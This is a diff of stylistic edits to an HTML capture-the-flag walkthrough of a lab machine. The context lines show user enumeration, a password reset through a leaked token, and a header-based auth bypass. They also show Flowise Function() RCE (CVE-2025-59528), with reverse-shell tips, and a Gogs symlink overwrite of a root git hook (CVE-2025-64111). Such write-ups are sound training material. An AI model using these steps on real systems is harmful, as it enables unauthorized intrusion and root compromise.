@@ -87,7 +87,7 @@
 <section class="wp-stage" id="recon" data-stage="1">
 <div class="wp-stage-lbl">Stage 1 &middot; Recon</div>
 <h2 class="wp-stage-title">Two ports, one vhost, and a Flowise staging instance nobody locked down.</h2>
-<div class="wp-stage-body"><p>Nmap shows the usual minimal Linux footprint: <span class="hl-cool">22</span> SSH and <span class="hl-cool">80</span> HTTP behind nginx. The web server redirects to <code>silentium.htb</code>.</p>
+<div class="wp-stage-body"><p>Nmap shows two open ports: <span class="hl-cool">22</span> SSH and <span class="hl-cool">80</span> HTTP behind nginx. The web server redirects to <code>silentium.htb</code>.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ nmap -sC -sV -p 22,80 10.129.18.201
@@ -116,7 +116,7 @@ staging                 [Status: 200]</code></pre>
 </div>
 
 
-<p>The main site is a static corporate page for &quot;Silentium International Asset Management&quot;. The team section lists a few employees, notably <span class="hl-red">Ben</span> with only a first name — potential username.</p>
+<p>The main site is a static corporate page for &quot;Silentium International Asset Management&quot;. The team section lists employees, including <span class="hl-red">Ben</span>. The first name is a possible username.</p>
 <p>The staging subdomain runs <strong>Flowise 3.0.5</strong>, an open-source AI agent builder:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">api · version check</span></div>
@@ -125,7 +125,7 @@ staging                 [Status: 200]</code></pre>
 </div>
 
 
-<p>Most API endpoints return <code>{&quot;error&quot;:&quot;Unauthorized Access&quot;}</code> — authentication is enabled. But the login endpoint leaks whether a user exists: a non-existent user returns <span class="hl-red">404</span> while a valid one returns <span class="hl-red">401</span>.</p>
+<p>Most API endpoints return <code>{&quot;error&quot;:&quot;Unauthorized Access&quot;}</code> because authentication is enabled. But the login endpoint leaks whether a user exists: a non-existent user returns <span class="hl-red">404</span> while a valid one returns <span class="hl-red">401</span>.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">api · user enumeration</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
@@ -178,7 +178,7 @@ $ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
 </div>
 
 
-<p>We get a bcrypt hash (cost factor 5 — crackable) and, more importantly, a <code>tempToken</code> valid for 15 minutes. <mark>No cracking needed — the token lets us reset the password directly.</mark></p>
+<p>The response contains a bcrypt hash with cost factor 5 and a <code>tempToken</code> valid for 15 minutes. <mark>The token lets us reset the password without cracking the hash.</mark></p>
 <h3>Password Reset via tempToken</h3>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">api · password reset</span></div>
@@ -188,7 +188,7 @@ $ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
 </div>
 
 
-<p>Password reset confirmed. Now we log in and grab the Flowise API key. The <code>x-request-from: internal</code> header is critical — it bypasses the Flowise basic auth middleware layer, letting the JWT session cookie reach the API key endpoint.</p>
+<p>Password reset confirmed. Now we log in and grab the Flowise API key. The <code>x-request-from: internal</code> header bypasses the Flowise basic auth middleware layer, letting the JWT session cookie reach the API key endpoint.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">api · login + API key retrieval</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ curl -s -X POST <span class="hljs-string">&quot;http://staging.silentium.htb/api/v1/auth/login&quot;</span> \
@@ -203,11 +203,11 @@ $ curl -s -H <span class="hljs-string">&quot;x-request-from: internal&quot;</spa
 
 
 <h3>RCE via CustomMCP (CVE-2025-59528)</h3>
-<p>Flowise &lt; 3.0.6 has a <span class="hl-red">CVSS 10.0</span> RCE. The <strong>CustomMCP</strong> node passes user input from <code>mcpServerConfig</code> directly to JavaScript&#39;s <code>Function()</code> constructor — effectively <code>eval()</code>.</p>
+<p>Flowise &lt; 3.0.6 has a <span class="hl-red">CVSS 10.0</span> RCE. The <strong>CustomMCP</strong> node passes user input from <code>mcpServerConfig</code> directly to JavaScript&#39;s <code>Function()</code> constructor, effectively <code>eval()</code>.</p>
 <aside class="wp-callout wp-note"><div class="wp-callout-head">Important details</div><div class="wp-callout-body"><ul>
-<li><code>mcpServerConfig</code> <strong>must</strong> be nested inside the <code>inputs</code> object — top-level placement will not trigger execution.</li>
+<li><code>mcpServerConfig</code> <strong>must</strong> be nested inside the <code>inputs</code> object. Top-level placement will not trigger execution.</li>
 <li><code>process.mainModule.require(&quot;child_process&quot;)</code> escapes the <code>Function()</code> scope to access Node.js internals.</li>
-<li>Standard bash reverse shells fail because the Docker container runs <strong>Alpine Linux</strong> with BusyBox <code>sh</code> — no <code>/dev/tcp</code> support. Use Python3 or direct exfiltration instead.</li>
+<li>Standard bash reverse shells fail because the Docker container runs <strong>Alpine Linux</strong> with BusyBox <code>sh</code>, which has no <code>/dev/tcp</code> support. Use Python3 or direct exfiltration instead.</li>
 </ul>
 </div></aside>
 
@@ -266,7 +266,7 @@ ben@silentium:~$ <span class="hljs-built_in">cat</span> user.txt
 <div class="wp-stage-lbl">Stage 4 &middot; Privesc</div>
 <h2 class="wp-stage-title">Gogs running as root, a symlink, and a git hook that shouldn&#39;t exist.</h2>
 <div class="wp-stage-body"><h3>Internal Service Discovery</h3>
-<p>First order of business after landing: check for internal services.</p>
+<p>After connecting, check for internal services.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ben@silentium.htb</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">ben@silentium:~$ ss -tlnp
@@ -305,7 +305,7 @@ $ curl -s -X POST <span class="hljs-string">&quot;http://127.0.0.1:3001/api/v1/u
 <h3>Symlink Path Traversal to RCE (CVE-2025-64111)</h3>
 <p>Gogs &lt;= 0.13.3 allows authenticated users to modify files within the <code>.git</code> directory through the <strong>contents API</strong> by following symlinks. The <code>UpdateRepoFile</code> function bypasses the security checks that the web UI enforces.</p>
 <p>The target: the <strong>pre-receive git hook</strong> in the bare repository. Since Gogs runs as root, the hook fires as root on every <code>git push</code>.</p>
-<p><strong>Step 1</strong> — Create and push a symlink pointing to the pre-receive hook:</p>
+<p><strong>Step 1:</strong> Create and push a symlink pointing to the pre-receive hook:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">exploit · symlink creation</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ <span class="hljs-built_in">cd</span> /tmp &amp;&amp; <span class="hljs-built_in">mkdir</span> hookpwn &amp;&amp; <span class="hljs-built_in">cd</span> hookpwn &amp;&amp; git init
@@ -320,7 +320,7 @@ $ git push <span class="hljs-string">&quot;http://<span class="hljs-variable">${
 </div>
 
 
-<p><strong>Step 2</strong> — Overwrite the hook through the symlink via the API:</p>
+<p><strong>Step 2:</strong> Overwrite the hook through the symlink via the API:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">exploit · hook overwrite via API</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ PAYLOAD=<span class="hljs-string">&#x27;#!/bin/bash
@@ -340,7 +340,7 @@ $ curl -X PUT <span class="hljs-string">&quot;http://127.0.0.1:3001/api/v1/repos
 
 
 <p>The API follows the symlink and writes our payload directly to the <strong>pre-receive</strong> hook file.</p>
-<p><strong>Step 3</strong> — Trigger the hook with any <code>git push</code>:</p>
+<p><strong>Step 3:</strong> Trigger the hook with any <code>git push</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">exploit · trigger hook</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;trigger&quot;</span> &gt; trigger.txt
@@ -378,7 +378,7 @@ f1e788007cb0a0fadd2c29fcfb59d0a9</code></pre>
 
 
 <p><span class="hl-ok">root.txt captured.</span> Rooted.</p>
-<aside class="wp-callout wp-warn"><div class="wp-callout-head">Warning</div><div class="wp-callout-body"><p>Three CVEs chained: an info disclosure that leaked a reset token (<span class="hl-red">GHSA-jc5m-wrp2-qq38</span>), an RCE via <code>Function()</code> eval (<span class="hl-red">CVE-2025-59528</span>, CVSS 10.0), and a symlink path traversal in Gogs (<span class="hl-red">CVE-2025-64111</span>). None required advanced tooling — just <code>curl</code>, <code>git</code>, and patience.</p>
+<aside class="wp-callout wp-warn"><div class="wp-callout-head">Warning</div><div class="wp-callout-body"><p>The chain used the reset-token disclosure (<span class="hl-red">GHSA-jc5m-wrp2-qq38</span>), the <code>Function()</code> RCE (<span class="hl-red">CVE-2025-59528</span>, CVSS 10.0), and the Gogs symlink traversal (<span class="hl-red">CVE-2025-64111</span>).</p>
 </div></aside></div>
 </section>
 
